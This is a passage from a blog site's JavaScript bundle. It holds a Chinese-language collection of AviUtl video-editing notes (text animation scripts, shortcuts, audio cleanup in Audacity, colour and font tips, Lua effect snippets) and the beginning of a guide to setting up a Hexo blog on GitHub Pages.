href=\"http://aviutl.info/plugins/#i-18\">【AviUtl】おすすめの便利プラグインまとめ【2018】</a>\n推薦插件懶人包。</li>\n</ul>\n<h3 id=\"ta-normal\">TA-Normal</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://seguimiii.com/aviutl-tech/tatrack\">TA-Track を使ったテキストの演出 – FLAPPER</a></li>\n<li>由 93 所製作的文字動畫腳本</li>\n<li>需勾選文字<code>個別物件化</code></li>\n<li><code>in/out</code>: -100 至 0 登場，0 至 100 退場</li>\n<li><code>ズレ</code>: 首文字至末文字出現變化的時間差，<code>0</code> 則一同變化</li>\n<li><code>order</code>: <code>0</code> 順時鐘，<code>1</code> 逆時鐘，<code>2</code> 中間為起點，<code>3</code> 隨機，<code>{0,0}</code> 分別設定 <code>in</code> 與<code>out</code></li>\n<li><code>seed</code>: <code>order</code> 設為 3 時所使用的亂數，同樣可使用 {0,0} 分別設定</li>\n</ul>\n<h3 id=\"ta-標準登場\">TA 標準登場</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ocraviutl.fandom.com/ja/wiki/%E3%81%95%E3%81%A4%E3%81%8D/TA\">さつき/TA | OCR &amp; Aviutl Wiki | Fandom</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm26208050\">TA 標準登場を使った小技 - ニコニコ動画</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/m93/blomaga/ar782185\">TA 標準登場を使った小技 補足 と その他使用したエフェクトなど</a></li>\n<li>由 さつき 所製作的文字動畫腳本</li>\n</ul>\n<ol>\n<li>X 距離: <code>obj.ox</code> or <code>obj.ox*2</code></li>\n<li>X 距離: <code>-obj.ox</code>\nトラッキング</li>\n<li>Y 距離: <code>obj.oy</code></li>\n<li>X 距離: <code>obj.ox</code> + Y 距離: <code>obj.oy</code></li>\n<li>X 距離: <code>-obj.ox</code> + Y 距離: <code>-obj.oy</code></li>\n<li>X 距離: <code>obj.x</code> + Y 距離 <code>obj.y</code></li>\n<li>X 距離: <code>-obj.x</code> + Y 距離 <code>-obj.y</code></li>\n<li>X 距離: <code>obj.x+obj.ox</code> + Y 距離 <code>obj.y+obj.oy</code></li>\n<li>X 距離: <code>obj.x-obj.ox</code> + Y 距離 <code>obj.y-obj.oy</code></li>\n<li>X 距離: <code>-obj.w</code></li>\n<li>Y 距離: <code>-obj.h</code></li>\n<li>X 距離: <code>obj.index%2 * 200</code></li>\n<li>Y 距離: <code>(1+obj.index)%2 * 200</code></li>\n<li>X 距離: <code>obj.index%2 * 200</code> + Y 距離 <code>(1+obj.index)%2 * 200</code></li>\n<li>Y 距離: <code>0 * math.sin(math.pi/2*obj.index)</code></li>\n<li>Y 距離: <code>0 * math.sin(math.pi/2*obj.index)</code>\n+ X 距離 <code>200 * math.cos(math.pi/2*obj.index)</code></li>\n<li>Y 距離: <code>rand(-300, 300, obj.index, 0)</code></li>\n<li>Y 距離: <code>(obj.index==5 and 200) or 0</code></li>\n<li>Y 距離: <code>(obj.index&lt;5 and 300) or -200</code></li>\n</ol>\n<h3 id=\"delaydraw2\">DelayDraw2</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://scrapbox.io/aviutl/DelayDraw2\">DelayDraw2 - AviUtl</a></li>\n</ul>\n<h3 id=\"shortkey\">Shortkey</h3>\n<p><code>Ctrl + N</code>: 建立新專案</p>\n<p><code>S</code>: 切割選擇物件</p>\n<p><code>R</code>: 新增中間點</p>\n<p><code>E</code>: 新增效果</p>\n<p><code>T</code>: 更改選擇物件時間長度</p>\n<p><code>TAB</code>: 切換至當前幀的物件</p>\n<p><code>W</code>: 切換至下個物件</p>\n<p><code>Q</code>: 切換至前個物件</p>\n<p><code>G</code>: 切換格線系統顯示</p>\n<p><code>Ctrl+V</code>: 顯示幀外區域</p>\n<h3 id=\"個別オブジェクト指定制御スクリプト\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm33005753\">個別オブジェクト指定制御スクリプト</a></h3>\n<ul>\n<li>@B2_LimitedEffecter.anm</li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">設定選擇欲操作的個別物件參數</code></pre><h3 id=\"ちょっとノリノリスクリプト\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm33151219\">ちょっとノリノリスクリプト</a></h3>\n<pre class=\"language-\"><code class=\"language-\">Pattern:\n1. 反轉\n2. 反復移動\n3. 擴大縮小\n4. 擴大縮小(縱向)\n5. 擴大縮小(斜向)\n6. 透明度\n7. 回轉\n8. 亮度\n9. 模糊\n10. 發光\n11. 逆光\n12. 放射模糊\n13. 振動\n14. 扭曲\n15. 波紋\n16. 色偏\n17. 跳動\n18. 搖晃\n19. 隨機瞬間移動\n20. 隨機移動\n21. 爆氣\n22. 彈動\n23. 齒輪\n24. 隨機放大\n25. 隨機放大移動\n26. 隨機角度\n27. 隨機角度移動\n28. 反復橫向跳動\n29. 放射線移動\n30. 色相</code></pre><h3 id=\"文字前後關係\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/_e_Pi_/status/1015723721468727296\">文字前後關係</a></h3>\n<pre class=\"language-\"><code class=\"language-\">[テキスト]\n[テキスト一枚化 *@rikkyテキスト]\n[縁取り]\n[シャドー]</code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/cossy\">cossy ｜ note</a></li>\n</ul>\n<h2 id=\"其他工具\">其他工具</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://obsproject.com/ja/download\">Open Broadcaster Software</a>\n現代首選的免費直播軟體，用來錄影也非常方便。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://avidemux.sourceforge.net/download.html\">Avidemux</a>\n若覺得 AviUtl 的前置作業仍然太過繁複，只想上簡單的字幕，\n或只想幫影片做簡單的剪接可以選擇這個工具。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.audacityteam.org/\">Audcaity</a>\n好用的免費聲音剪輯後製軟體，後製影片發現聲音太小\n或是聲音大小不一時，常會使用 Compressor 來解決。</li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">去除噪音：\na. 選取噪音的區間\nb. 效果→Noice Reduction，點選取得噪音設定檔\nc. 任意點選視窗內的其他位置解除選取狀態，\n    再次點開效果→Noice Reduction之後，\n    將Sensitivity設定在4.0左右後點選OK便可。\n\n校平器：\na. 效果→校平器\n在不會破音的程度下增加音量大小，請依照自己的主觀程度進行調整。\n\n壓縮器：\na. 效果→壓縮器\n    會將波形較大的聲音下壓，並將較小的聲音放大，\n    讓整體的聲音盡可能保持在差不多的大小。\n    因此即使不進行效平器的效果套用也是可以的。\n    點選後出現的圖表橫軸為現在的音量，縱軸為套用壓縮器後的音量。\n</code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/acrisol/blomaga/ar821397\">Audacity で実況音声を聴きやすくする技術</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://taira-komori.jpn.org/06compressor.html\">コンプレッサー</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://soundengine.jp/wordpress/tips/glossary/403/\">ノーマライズとは</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.nikse.dk/subtitleedit/\">Subtitle Edit</a>\n編輯字幕用軟體，個人常用與 PSDToolKit 製作影片。</li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">常用快捷鍵一覽：\nF8：播放/暫停影片\nF9：增加新字幕\nF11：設定字幕開始位置\nF12：設定字幕結束位置\nF5：播放被選取的字幕\nAlt+↑/↓：選取上/下一句字幕\n</code></pre><h3 id=\"motion-periodic-table\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://foxcodex.html.xdomain.jp/\">MOTION PERIODIC TABLE</a></h3>\n<p>抽出 Motion Graph 裡的基本要素，並基於規則整理成元素周期表形式的格式。</p>\n<pre class=\"language-\"><code class=\"language-\">1 族：Offset、回轉類\n2 族：變形類\n3 族：時間操作類\n4-8 族：特殊\n9 族：腳本類\n10 族：Wipe類\n11 族：擴散類\n12-13 族：模糊、光源類\n14 族：移動類\n15 族：回轉類\n16 族：放大縮小類\n17 族：修飾類\n18 族：碎形類\n\n重要、使用頻率高的要素會盡量置於周期上方。\n</code></pre><h3 id=\"【03】【aviutl】コツとか講座的な動画\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=L0iPNN0a9q4\">【#03】【Aviutl】コツとか講座的な動画</a></h3>\n<ol>\n<li>推薦腳本\nUndoFish - easing\nさつき - スクリプト一式\n常用: 斜めブラインド、円形並べ、画像ループ 2</li>\n<li>關於文字\n縁取り＋シャドー\nグラデーション＋縁取り＋シャドー\nグラデーション＋縁取り＋縁取り＋縁取り\nグラデーション＋縁取り＋縁取り＋縁取り＋シャドー\nグラデーション＋縁取り＋シャドー＋縁取り＋縁取り</li>\n</ol>\n<h3 id=\"15-秒でわかる-aviutl-の豆知識\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/seruire/status/1013719050151575552?s=12\">15 秒でわかる Aviutl の豆知識</a></h3>\n<ol>\n<li>不要使用預設顏色</li>\n<li>巨大的圓加上模糊就成背景</li>\n<li>Loop 小圖形</li>\n<li>替圖形加上最細的斜ブラインド</li>\n<li>Frame Buffer + 圖片 Loop + 50%放大率</li>\n<li>替文字加上邊框和影子</li>\n<li>使用 easing</li>\n</ol>\n<h3 id=\"aviutl-の、小技・小テクニック・小ネタよせあつめ\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/jiro2CSVmemo/blomaga/ar1115152\">AviUtl の、小技・小テクニック・小ネタよせあつめ</a></h3>\n<ul>\n<li>AviUtl 的小技巧整理</li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">1. 回顧 Shortkey\n2. Backup 是救命繩\n3. 勾選「画像処理を間引いて表示」可減輕處理負荷\n4. LuaJIT 版的 lua51.dll\n5. 文字尺寸放大、擴大率縮小->銳利度上升\n6. 常見文字設計\n・ロンハーから\n文字(淡青)：シャドー(濃青・左上)・縁取り(白)・シャドー(淡緑・右下)x2\n文字(淡赤)：縁取り(赤)・シャドー(赤・右下)x2\n影(白)：縁取り(白)・ぼかし\nハーフトーン(白)：縁取り(白)・ぼかし・モザイクマスク(R改)\n文字(濃黄)：縁取り(白)・シャドー(淡黒・右)・縁取り(黄)\n\n・知らない世界から\n文字(濃赤)\n影1(白)：縁取り(白)・ぼかし\n影2(黄)：縁取り(黄)・ぼかし\n文字(淡青)：縁取り(白)・シャドー(黒・右下)\n文字(赤)：シャドー(濃赤・右下)・シャドー(中央)\n7. 降低彩度\n8. 使用領域拡張+クリッピング的演出\n9. 糊焦\nFrameBuffer + 模糊範圍5 透明度40 + 合成模式 Screen\n10. 三大模糊\nX/Y軸移動->方向模糊\nZ軸移動->放射模糊\nZ軸旋轉->旋轉模糊\n11. 圖形經過的地方變色\n^\n上  「AviUtl（赤、上のオブジェクトでクリッピング適用）」\n至 「図形」\n下 「AviUtl（白）」\n\n^\n上  「元画像」\n至 「メロンパン（縁取り+ぼかし）」\n下 「元画像（明るさ↓+ぼかし：陰影、上のオブジェクトでクリッピング適用）」\n    「メロンパン」\n12. 推薦腳本\n+ ベジエ軌道T\n+ ランダム配置@ANM1でパーティクルっぽいの\n+ ティム氏の縁取りTスクリプト\n+ 93氏のMultiSlicer\n</code></pre><h3 id=\"從零開始的-mad-剪輯【場景切換加入文字特效】\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm32980085\">從零開始的 MAD 剪輯【場景切換/加入文字/特效】</a></h3>\n<pre class=\"language-\"><code class=\"language-\">+ 場景切換\nぼかし\nレンズブラー\nグロー\nグロー＋単色化\nラスター\nラスター＋色ずれ\nラスター＋グロー\nリール回転\nMultiSlicer\n+ 文字\n明朝\n縁取り\n円形\n差分\n大きい文字\n座標の拡大縮小\nTAぼかし登場\n拡大縮小して登場\n+ 效果\nフレームバッファ＋拡大率\nフレームバッファ＋振動\nフレームバッファ＋色ずれ\nフレームバッファ＋座標移動\nフレームバッファ＋ランダムラスター\nフレームバッファ＋ランダム色ずれ\nフレームバッファ＋色調補正\nフレームバッファ＋ランダム小物配置\nフレームバッファ＋本当のブロックノイズ\nフレームバッファ＋レンズフレア\nフレームバッファ＋周辺ボケ光線\nフレームバッファ＋セピアノイズ\n+ 素材\nNC131110 側邊雜訊\nNC116843 繪本效果\nNC116839 簽筆筆處\nNC130133 電影膠捲\nNC63190 掃描線\n</code></pre><h3 id=\"業餘人士所製作的新、中手向-motiongraph-講座\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm29882572\">業餘人士所製作的新、中手向 MotionGraph 講座</a></h3>\n<pre class=\"language-\"><code class=\"language-\">+ 移動圖形\n移動是MG的基本\n只要改變座標即可\n+ 使用加減速\n進階->easing\n+ 「錯開」\n1. 錯開「圖形的位置」\n2. 錯開「移動的距離」\n3. 錯開「圖形的大小」\n4. 錯開「移動的方向」\n5. 錯開「圖形的速度」\n</code></pre><h3 id=\"簡單的配色方法\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/Aodaruma_/status/835723839472488450\">簡單的配色方法</a></h3>\n<pre class=\"language-\"><code class=\"language-\">彩度: 顏色的鮮豔度\n高彩度: 休閒、活潑\n低彩度: 自然、放鬆\n輝度: 顏色的明亮度\n高輝度: 生態、優雅\n低輝度: 懷舊、紳士\n</code></pre><h3 id=\"mov-講\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/Aodaruma_/status/787322133315661824\">Mov 講</a></h3>\n<pre class=\"language-\"><code class=\"language-\">心理4原色: 人類認識顏色的四大色，紅、黃、綠、藍。\n12色相環: 將心理4原色的間色和對比色補完後的色環，以及再做一次補色的24色相環。\n</code></pre><h3 id=\"【aviutl-の使い方】作業効率が向上するタイムラインの操作\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=6h7jBl0PsLI\">【AviUtl の使い方】作業効率が向上するタイムラインの操作</a></h3>\n<pre class=\"language-\"><code class=\"language-\">1. 捲動Timeline\n+ 滾輪: 左右移動\n+ Alt+滾輪 上下移動\n+ Alt+左鍵\n2. 多重選擇物件\n+ Ctrl + 左鍵: 單選\n+ Ctrl + 左鍵拖曳: 複選\n+ Shift + Ctrl + 左鍵: 複選起點至終點間的物件\n+ Ctrl + 左鍵點選Layer: 圈選Layer內所有物件\n+ Ctrl+右鍵: Menu可選擇物件範圍\n3. 修改複數物件\n+ 在多重選擇狀況下，修改好第一個物件的數值後，點擊數值旁的鍵頭圖項即可套用至其他複選物件\n+ 亦可套用複數效果\n+ 無法同時修改中位點的數值與刪除效果\n4. 一體化\n+ 複選後右鍵→グループ化\n+ 可以同時移動物件位置、中位點時間點、長短\n5. 插入空幀\n+ 右鍵→空フレームの挿入\n6. 鎖定Layer\n+ 對最左邊欲鎖定的Layer右鍵→レイヤーのロック\n+ 仍會受到空幀插入的影響\n7. 連結座標\n+ 對最左邊欲連結的Layer右鍵→座標のリンク\n+ 同Layer下所有物鍵的座標會統一\n+ 只能使用移動功能，直接輸入數值無效\n+ 只適用X, Y, Z的座標數值\n</code></pre><h3 id=\"漫畫、同人誌的字體選擇\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/mizuako_d/status/1039078201274720256?s=12\">漫畫、同人誌的字體選擇</a></h3>\n<pre class=\"language-\"><code class=\"language-\">放送や回想シーン用: 源瑛ラテゴ\nモノローグ用: 源柔ゴシックMedium\n心の中のセリフ用: 源真ゴシックRegular\n一般的なセリフ用: I-OTF アンチック Std B / F910新コミック体\n強調セリフ: 源瑛Nuゴシック\nかわいい感じのセリフ: ぼくたちのゴシック2ボールド\nかわいい感じのセリフ: りいポップ角\n恐怖: g_コミックホラー\n\n長文: 細い明朝體\n短文: 黑體\n不在本文內使用裝飾系字體\n\n・文字の太さ＝相手との距離感\n・基準グリフからの変形量＝対象の運動量\n・装飾としての太さ＝対象の質量\n・角/跳ねセリフの差＝対象の速度\n\n一般字幕是1秒中4字，一個畫面最多兩行（是日文）。\n十五秒的廣告，每一畫面長平均1.5秒－2秒。\n音樂動畫每一畫面平均3秒－4秒。\n三十分鐘的節目每一畫面平均20秒。\n資訊性節目的每一個畫面平均5－10秒。\n電影的每一畫面平均9秒。\n\n以上是日文，據分析中文比日文濃縮四倍，所以時間應更長\n</code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://seguimi.blog.fc2.com/blog-entry-559.html\">スクリプト・プラグイン一覧</a></li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">文字輪郭追跡\nsinwave\n砕け散るパズル\nレイヤーにライン (2D)\nDelay 個別\n集中線 T\nTA-Anchour\nTA-Arrange\nTA-Normal\n簡易水玉\n漫画化\n曲面変形\nゆらめき\nカラーパレット\nPNG 出力\nMultiSlicer\n中点無視 (R)\nライン * R\nオートターゲット\n簡易変形シリーズ\nベジエ軌道 T\n被写界深度\nパペットツール (R)\nロール巻取 (ページめくり)\n扇クリッピング (R)\nカスタムフレアとプリセット\n風揺れ\n画像プルンプルンスクリプト\nイージング\n巻く\n虹色グラデーション\n色調調整セット ver5\n泡\n燃焼\n輪郭追跡\n扇クリッピング (現在入手不可)→記事\nはためき\n飛び舞う格子線\n砂状 (現在入手不可→) 記事\nルービックキューブ\n角丸四角形\nTracking ライン\n</code></pre><h3 id=\"aviutil-勝手に勉強会-2\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/chana7/blomaga/ar712919\">Aviutil 勝手に勉強会 2</a></h3>\n<h3 id=\"aviutl-テクニックモーメント\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://twitter.com/i/moments/904588884427685888\">Aviutl テクニックモーメント</a></h3>\n<h3 id=\"オブジェクト分割と-delay-個別\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://seguimi.blog.fc2.com/blog-entry-719.html\">オブジェクト分割と Delay 個別</a></h3>\n<h3 id=\"一括でオブジェクトを動かす【aviutl】\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/Jinsichi/blomaga/ar217688\">一括でオブジェクトを動かす【AviUtl】</a></h3>\n<h3 id=\"【aviutl】ありふれたういんどうず-製作のすゝめ\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://ch.nicovideo.jp/jiro2CSVmemo/blomaga/ar1015784\">【AviUtl】ありふれたういんどうず　製作のすゝめ</a></h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm35223553\">aviutl でカットインを作成</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://nico.ms/sm16555929\">【AviUtl】 オートターゲット スクリプト</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nicovideo.jp/watch/sm36195005\">2020 年版 AviUtl ―フリー高性能動画編集ソフト― を導入しよう</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://scrapbox.io/aviutl-script/obj\">https://scrapbox.io/aviutl-script/obj</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://aviutlscript.wiki.fc2.com/\">https://aviutlscript.wiki.fc2.com/</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://mypacesnail.hatenablog.com/entry/2018/12/15/212159\">https://mypacesnail.hatenablog.com/entry/2018/12/15/212159</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/erioru/e56f31cae4806156f38f\">https://gist.github.com/erioru/e56f31cae4806156f38f</a></li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">@デバッグ\ndebug_print(string.format(\"%f\",obj.track0))\ndebug_print(string.format(\"%f\",obj.getvalue(0)))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@変数\nlocal fsize=obj.track0\ndebug_print(string.format(\"%f\",fsize))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@色調補正\nobj.effect(\"色調補正\",\"明るさ\",113.0,\"ｺﾝﾄﾗｽﾄ\",110.0,\"輝度\",120.0)\n</code></pre><pre class=\"language-\"><code class=\"language-\">@グラデーション\nobj.effect(\"グラデーション\",\"強さ\",100,\"color\",RGB(248,248,248),\"color2\",RGB(96,96,96))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@シャドー\nobj.effect(\"シャドー\",\"X\",4,\"Y\",4,\"濃さ\",100,\"拡散\",0,\"color\",RGB(8,8,8))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@縁影\nobj.effect(\"縁取り\",\"サイズ\",6,\"ぼかし\",5,\"color\",RGB(248,248,248))\nobj.effect(\"シャドー\",\"X\",4,\"Y\",4,\"濃さ\",100,\"拡散\",0,\"color\",RGB(8,8,8))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@ダブル縁取り\nobj.effect(\"縁取り\",\"サイズ\",8,\"ぼかし\",10,\"color\",RGB(8,8,8))\nobj.effect(\"縁取り\",\"サイズ\",6,\"ぼかし\",5,\"color\",RGB(248,248,248))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@斜めシャドー縁\nobj.effect(\"縁取り\",\"サイズ\",8,\"ぼかし\",10,\"color\",RGB(8,8,8))\nobj.effect(\"シャドー\",\"X\",16,\"Y\",16,\"濃さ\",100,\"拡散\",0,\"color\",RGB(8,8,8))\nobj.effect(\"縁取り\",\"サイズ\",6,\"ぼかし\",5,\"color\",RGB(248,248,248))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@四角縁\nobj.effect(\"縁取り\",\"サイズ\",10,\"ぼかし\",10,\"color\",RGB(0,0,255))\nobj.effect(\"クリッピング\",\"上\",10,\"下\",10,\"左\",5,\"右\",5,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\nobj.effect(\"クロマキー\",\"color_yc\",ce010008b4fe)\n</code></pre><pre class=\"language-\"><code class=\"language-\">@四角縁ノイズ風\nobj.effect(\"縁取り\",\"サイズ\",10,\"ぼかし\",10,\"color\",RGB(0,0,255))\nobj.effect(\"クリッピング\",\"上\",10,\"下\",10,\"左\",5,\"右\",5,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\nobj.effect(\"クロマキー\",\"color_yc\",ce010008b4fe)\nobj.effect(\"ノイズ\",\"強さ\",33,\"周期X\",1,\"周期Y\",1,\"type\",5)\n</code></pre><pre class=\"language-\"><code class=\"language-\">@白字紅背\nobj.effect(\"縁取り\",\"サイズ\",10,\"ぼかし\",10,\"color\",RGB(255,0,0))\nobj.effect(\"クリッピング\",\"上\",5,\"下\",5,\"左\",10,\"右\",10,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@動的ダブル縁取り local\nlocal fsize=obj.track0\nobj.effect(\"縁取り\",\"サイズ\",fsize*8,\"ぼかし\",10,\"color\",RGB(8,8,8))\nobj.effect(\"縁取り\",\"サイズ\",fsize*6,\"ぼかし\",5,\"color\",RGB(248,248,248))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@斜めシャドー縁 local\nlocal fsize=obj.track0\nobj.effect(\"縁取り\",\"サイズ\",fsize*8,\"ぼかし\",10,\"color\",RGB(8,8,8))\nobj.effect(\"シャドー\",\"X\",16,\"Y\",16,\"濃さ\",100,\"拡散\",0,\"color\",RGB(8,8,8))\nobj.effect(\"縁取り\",\"サイズ\",fsize*6,\"ぼかし\",5,\"color\",RGB(248,248,248))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@四角縁 local\nlocal fsize=obj.track0\nobj.effect(\"縁取り\",\"サイズ\",fsize*10,\"ぼかし\",10,\"color\",RGB(0,0,255))\nobj.effect(\"クリッピング\",\"上\",fsize*10,\"下\",fsize*10,\"左\",fsize*10-10,\"右\",fsize*10-10,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\nobj.effect(\"クロマキー\",\"color_yc\",ce010008b4fe)\n</code></pre><pre class=\"language-\"><code class=\"language-\">@四角縁ノイズ風 local\nlocal fsize=obj.track0\nobj.effect(\"縁取り\",\"サイズ\",fsize*10,\"ぼかし\",10,\"color\",RGB(0,0,255))\nobj.effect(\"クリッピング\",\"上\",fsize*10,\"下\",fsize*10,\"左\",fsize*10-10,\"右\",fsize*10-10,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\nobj.effect(\"クロマキー\",\"color_yc\",ce010008b4fe)\nobj.effect(\"ノイズ\",\"強さ\",33,\"周期X\",1,\"周期Y\",1,\"type\",5)\n</code></pre><pre class=\"language-\"><code class=\"language-\">@白字紅背 local\nlocal fsize=obj.track0\nobj.effect(\"縁取り\",\"サイズ\",fsize*10,\"ぼかし\",10,\"color\",RGB(255,0,0))\nobj.effect(\"クリッピング\",\"上\",fsize*10-5,\"下\",fsize*10-5,\"左\",fsize*10-10,\"右\",fsize*10-10,\"中心の位置を変更\",1)\nobj.effect(\"縁取り\",\"サイズ\",3,\"ぼかし\",10,\"color\",RGB(0,0,0))\n</code></pre><pre class=\"language-\"><code class=\"language-\">@点付け\n<span class=\"token prolog\">&lt;? function ten(s,x,y,wait)\n    mes(\"&lt;r0>\")\n    for i=1, #s, 2 do\n        mes( \"&lt;r0>\"..string.sub(s,i,i+1)..\"&lt;p-\"..x..\",-\"..y..\">・&lt;p+0,+\"..y..\">&lt;w\"..wait..\">\")\n    end\n    mes(\"&lt;r>\")\nend\n?></span>\n<span class=\"token prolog\">&lt;? function ten2(s,x,y,wait)\n    mes(\"&lt;r0>\")\n    for i=1, #s, 1 do\n        mes( \"&lt;r0>\"..string.sub(s,i,i)..\"&lt;p-\"..x..\",-\"..y..\">･&lt;p+0,+\"..y..\">&lt;w\"..wait..\">\")\n    end\n    mes(\"&lt;r>\")\nend\n?></span>\n＜?ten(\"文字列\",[サイズ],[高さ],[待ち時間])?＞\n--半角英数はten2のほうで\n--定義して使ってください。\n</code></pre>","date":"2021-01-05T01:58:08.000Z","excerpt":"","printDate":"January 5, 2021","printReadingTime":"7 min read"};

var route_74 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod41
});

var Mod42 = {"title":"Blog with Hexo","slug":"blog-with-hexo","html":"<h2 id=\"指令速見表\">指令速見表</h2>\n<ol>\n<li>新建記事 <code>hexo n</code></li>\n<li>清除暫存 <code>hexo clean</code></li>\n<li>產生推播 <code>hexo g -d</code></li>\n</ol>\n<hr>\n<h2 id=\"0-準備安裝\">0. 準備安裝</h2>\n<p>開始使用 hexo 建置部落格之前，需先安裝 <code>git</code> 和 <code>nodejs</code></p>\n<p>安裝建置用的相關套件： <code>npm install hexo-cli -g</code></p>\n<p>本文預設使用 GitHub 做為建置平台，Hexo 可放置於 GitHub Pages 的主分支上，或是子網域頁面（在 GitHub Pages 主頁面的專案之外另開一個專案）上</p>\n<p>參考： <a target=\"_blank\" rel=\"nofollow\" href=\"http://alincode.github.io/blog/2016/03/05/hexo-deploy/\">將 hexo 部署到 GitHub page</a></p>\n<h2 id=\"1-放置網域\">1. 放置網域</h2>\n<h3 id=\"a-github-pages-主分支（repourl-accountnamegithubio）\">a. GitHub Pages 主分支（repo/url: <code>AccountName.github.io</code>）</h3>\n<ol>\n<li>以 <code>自己的 GitHub 帳號.github.io</code> 命名建立一個 Repo ，遵循網頁上的指令完成建立作業</li>\n<li>進行後續建置</li>\n</ol>\n<p>參考：</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/github/using-github-pages.html\">使用 GitHub 免費製作個人網站</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/doggy8088/Learn-Git-in-30-days/blob/master/zh-tw/24.md\">使用 GitHub 遠端儲存庫 - 入門篇</a></li>\n</ul>\n<h3 id=\"b-子網域頁面（repo-reponame-url-accountnamegithubioreponame）\">b. 子網域頁面（repo: <code>RepoName</code>, url: <code>AccountName.github.io/RepoName</code>）</h3>\n<ol>\n<li>以 <code>子網域名稱</code> 命名建立一個 Repo ，遵循網頁上的指令完成建立作業</li>\n<li>建立 <code>gh-pages</code> 分支</li>\n<li>切回 <code>master</code> 主支進行後續建置</li>\n</ol>\n<p>參考：</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/doggy8088/Learn-Git-in-30-days/blob/master/zh-tw/08.md\">關於分支的基本觀念與使用方式</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/branch/using-branch.html\">開始使用分支</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitbook.tw/chapters/github/push-to-github.html\">Git 教學：如何 Push 上傳到 GitHub？</a></li>\n</ul>\n<h2 id=\"2-部落格建構\">2. 部落格建構</h2>\n<h3 id=\"a-初始化\">a. 初始化</h3>\n<ol>\n<li>將建立好的 Repo pull 至本地硬碟裡後，將命令列錨點移至該資料夾內</li>\n<li>確定分支為 <code>master</code> 之後，使用 <code>hexo init blog-name</code> 指令初始化存放部落格內容的資料夾</li>\n<li>將錨點移進該資料夾內，執行 <code>npm install</code> 與 <code>hexo init</code> 完成初始化</li>\n</ol>\n<h3 